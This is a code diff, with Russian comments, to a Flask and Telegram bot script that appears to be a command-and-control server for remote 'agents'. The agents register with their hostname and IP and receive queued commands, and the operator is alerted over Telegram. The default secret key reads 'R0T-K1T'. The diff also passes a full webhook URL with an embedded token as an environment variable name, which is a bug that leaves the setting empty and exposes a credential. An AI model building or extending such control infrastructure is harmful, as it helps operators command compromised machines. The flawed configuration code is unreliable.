@@ -15,7 +15,7 @@ SECRET_KEY = os.environ.get("SECRET_KEY", "R0T-K1T")
 PROXY = os.environ.get("PROXY", "")  # например socks5://user:pass@host:port
 WEBHOOK_URL = os.environ.get("https://gw.bothost.ru/nl4/api/webhooks/github?token=09195eee6ee326686ddedd677cba19b04d2e5532f1b17280", "")  # публичный URL вашего скрипта
 
-# === НАСТРОЙКА ПРОКСИ ДЛЯ БОТА ===
+# === ПРОКСИ ===
 if PROXY:
     apihelper.proxy = {'https': PROXY, 'http': PROXY}
 
@@ -32,7 +32,7 @@ def send_to_admin(text, file=None):
         else:
             bot.send_message(ADMIN_ID, text)
     except Exception as e:
-        print(f"Ошибка отправки в Telegram: {e}")
+        print(f"Ошибка отправки: {e}")
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -48,7 +48,7 @@ def register():
         "ip": data.get("ip", "?"),
         "last_seen": time.time()
     }
-    send_to_admin(f"🆕 Агент зарегистрирован: {agent_id} ({agents[agent_id]['hostname']})")
+    send_to_admin(f"🆕 Агент: {agent_id} ({agents[agent_id]['hostname']})")
     return jsonify({"status": "ok"})
 
 @app.route('/send_message', methods=['POST'])
@@ -105,15 +105,13 @@ def add_command():
     commands_queue[agent_id].append(command)
     return jsonify({"status": "ok"})
 
-def run_bot():
+# === ЗАПУСК БОТА (Webhook или polling) ===
+if __name__ == '__main__':
     if WEBHOOK_URL:
         bot.remove_webhook()
         bot.set_webhook(url=WEBHOOK_URL)
         print(f"Webhook установлен: {WEBHOOK_URL}")
     else:
-        print("Запущен polling")
-        bot.polling(none_stop=True)
-
-if __name__ == '__main__':
-    threading.Thread(target=run_bot, daemon=True).start()
+        print("Использую polling (но может не работать без прокси)")
+        threading.Thread(target=bot.polling, kwargs={'none_stop': True}, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
